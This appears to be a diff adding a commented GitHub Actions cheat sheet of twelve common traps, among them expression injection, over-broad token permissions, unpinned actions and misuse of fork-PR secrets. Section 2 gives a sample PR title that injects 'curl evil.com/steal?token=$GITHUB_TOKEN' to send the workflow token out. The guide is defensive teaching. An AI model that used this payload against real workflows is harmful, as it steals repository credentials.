@@ -1,0 +1,230 @@
+# ============================================================
+# GitHub Actions Gotchas — Common Traps & Mistakes
+# ============================================================
+
+
+# ============================================================
+# 1. DEFAULT PERMISSIONS ARE TOO BROAD
+# ============================================================
+
+# By default, GITHUB_TOKEN has write access to most things.
+# If you don't restrict it, any compromised action can push
+# code, create releases, or modify issues.
+
+# Fix: set restrictive defaults, grant per-job.
+permissions: {}
+
+# jobs:
+#   build:
+#     permissions:
+#       contents: read
+#     ...
+
+# Even better: set "Read repository contents and packages permissions"
+# as the default in Settings → Actions → General → Workflow permissions.
+
+
+# ============================================================
+# 2. EXPRESSION INJECTION
+# ============================================================
+
+# User-controlled values in ${{ }} are interpolated BEFORE the shell runs.
+# An attacker can inject shell commands through PR titles, branch names, etc.
+
+# VULNERABLE:
+# - name: Greet
+#   run: echo "PR title: ${{ github.event.pull_request.title }}"
+#   # If PR title is:  "; curl evil.com/steal?token=$GITHUB_TOKEN #
+#   # The shell sees:  echo "PR title: "; curl evil.com/steal?token=$GITHUB_TOKEN #"
+
+# SAFE — use an env var (shell handles escaping):
+# - name: Greet
+#   run: echo "PR title: $PR_TITLE"
+#   env:
+#     PR_TITLE: ${{ github.event.pull_request.title }}
+
+# Dangerous contexts (user-controlled):
+#   github.event.pull_request.title
+#   github.event.pull_request.body
+#   github.event.issue.title
+#   github.event.issue.body
+#   github.event.comment.body
+#   github.event.head_commit.message
+#   github.head_ref (branch name)
+
+
+# ============================================================
+# 3. ACTION VERSION PINNING
+# ============================================================
+
+# Tags are mutable — a malicious maintainer can move v1 to a new commit.
+
+# Risky:
+#   uses: some-action@v1          # tag can be overwritten
+
+# Safe:
+#   uses: some-action@abc123def   # pinned to exact commit
+
+# Practical middle ground:
+#   - Pin by SHA for critical actions (checkout, deploy, auth)
+#   - Use Dependabot or Renovate to auto-update action SHAs
+#   - For your own actions and trusted orgs (actions/*), tags are ok
+
+
+# ============================================================
+# 4. SECRETS IN PULL REQUESTS
+# ============================================================
+
+# For PRs from FORKS, secrets are NOT available (security).
+# This is intentional — a fork could read your secrets.
+#
+# pull_request trigger → fork PR → secrets are empty strings.
+# pull_request_target trigger → runs in BASE repo context,
+#   HAS access to secrets, but the code being checked out
+#   is from the fork. Dangerous if you run untrusted code.
+#
+# Safe pattern for fork PRs:
+#   1. Run tests with pull_request (no secrets needed)
+#   2. Post results with workflow_run (has secrets, runs on main)
+
+# NEVER do this:
+# on: pull_request_target
+# steps:
+#   - uses: actions/checkout@v4
+#     with:
+#       ref: ${{ github.event.pull_request.head.sha }}  # fork code!
+#   - run: npm test  # running UNTRUSTED code with SECRET access
+
+
+# ============================================================
+# 5. PATHS FILTER + REQUIRED CHECKS = STUCK PRS
+# ============================================================
+
+# If a check is required but uses paths filter,
+# and a PR only changes files outside the path:
+#   → the check never runs → PR can't merge
+
+# Solutions:
+#   a. Use paths-filter action instead of on.push.paths
+#   b. Use a separate "skip" workflow that satisfies the check
+#   c. Don't make path-filtered workflows required
+
+
+# ============================================================
+# 6. CACHE KEY MISMATCHES
+# ============================================================
+
+# Cache is immutable. Same key = same content, forever.
+# If you change your lock file, you need a new key.
+
+# Bad: static key
+# key: node-modules-cache
+
+# Good: hash-based key
+# key: node-${{ runner.os }}-${{ hashFiles('package-lock.json') }}
+
+# Missing restore-keys means no fallback:
+# key: node-${{ runner.os }}-${{ hashFiles('package-lock.json') }}
+# restore-keys: |
+#   node-${{ runner.os }}-
+# This falls back to any cache starting with node-<os>-
+
+
+# ============================================================
+# 7. MATRIX + NEEDS = AWKWARD DEPENDENCY
+# ============================================================
+
+# A job depending on a matrix job waits for ALL matrix instances.
+# You can't depend on just one specific matrix combination.
+#
+# deploy:
+#   needs: test   # waits for ALL test matrix jobs (node 18, 20, 22)
+
+
+# ============================================================
+# 8. TIMEOUT DEFAULTS
+# ============================================================
+
+# Default job timeout: 360 minutes (6 hours!).
+# A hung process can burn through your minutes.
+# Always set a reasonable timeout:
+
+# jobs:
+#   build:
+#     timeout-minutes: 15
+#     steps:
+#       - run: npm run build
+#         timeout-minutes: 10  # per-step timeout
+
+
+# ============================================================
+# 9. STEPS AFTER FAILURE ARE SKIPPED
+# ============================================================
+
+# By default, if a step fails, all subsequent steps are skipped.
+# Cleanup, notifications, and artifact uploads need explicit conditions.
+
+# - name: Upload logs
+#   if: always()        # runs regardless of previous step status
+#   uses: actions/upload-artifact@v4
+#   with:
+#     name: logs
+#     path: /tmp/logs/
+
+# - name: Notify on failure
+#   if: failure()       # runs ONLY if a previous step failed
+
+
+# ============================================================
+# 10. ENV VARS DON'T PROPAGATE TO REUSABLE WORKFLOWS
+# ============================================================
+
+# Workflow-level env: vars are NOT passed to called reusable workflows.
+# You must pass everything through inputs.
+
+# env:
+#   MY_VAR: hello
+#
+# jobs:
+#   call:
+#     uses: ./.github/workflows/reusable.yml
+#     # MY_VAR is NOT available inside reusable.yml
+#     # Pass it explicitly:
+#     with:
+#       my_var: ${{ env.MY_VAR }}
+
+
+# ============================================================
+# 11. GITHUB_ENV vs GITHUB_OUTPUT
+# ============================================================
+
+# GITHUB_OUTPUT: pass values between steps (via step outputs)
+#   echo "key=value" >> $GITHUB_OUTPUT
+#   Access: ${{ steps.<id>.outputs.key }}
+
+# GITHUB_ENV: set env vars for SUBSEQUENT steps (not current one)
+#   echo "MY_VAR=hello" >> $GITHUB_ENV
+#   Access: $MY_VAR (in later steps only)
+
+# Common mistake: setting GITHUB_ENV and reading it in the same step.
+# - run: |
+#     echo "MY_VAR=hello" >> $GITHUB_ENV
+#     echo $MY_VAR  # EMPTY — not set until next step
+
+
+# ============================================================
+# 12. MULTILINE VALUES IN OUTPUTS
+# ============================================================
+
+# Simple values:
+#   echo "key=value" >> $GITHUB_OUTPUT
+
+# Multiline values need delimiters:
+#   {
+#     echo "key<<EOF"
+#     echo "line 1"
+#     echo "line 2"
+#     echo "EOF"
+#   } >> $GITHUB_OUTPUT
+
+# Without the delimiter syntax, only the first line is captured.
